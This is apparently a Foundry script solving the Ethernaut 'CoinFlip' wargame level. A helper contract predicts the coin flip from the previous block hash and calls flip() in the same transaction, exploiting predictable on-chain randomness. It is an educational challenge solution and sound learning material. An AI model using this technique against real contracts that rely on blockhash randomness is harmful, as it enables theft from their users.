// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/Level3.sol";
import {Script, console} from "forge-std/script.sol";

contract Player {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinFlip) {
        console.log("Number of win before execution is :", coinFlip.consecutiveWins());
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlips = blockValue / FACTOR;
        bool side = coinFlips == 1 ? true : false;
        console.log("here is the side I choose:", side);
        coinFlip.flip(side);
        console.log("Number of win after the flip is :", coinFlip.consecutiveWins());
    }
}

//------------------------------------CONTRACT 2------------------------------------------//
contract Level3solution is Script {
    CoinFlip public coinFlip = CoinFlip(0xe51FcA443348A7b935CA71638588A9B3cce86323);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinFlip);
        vm.stopBroadcast();
    }
}
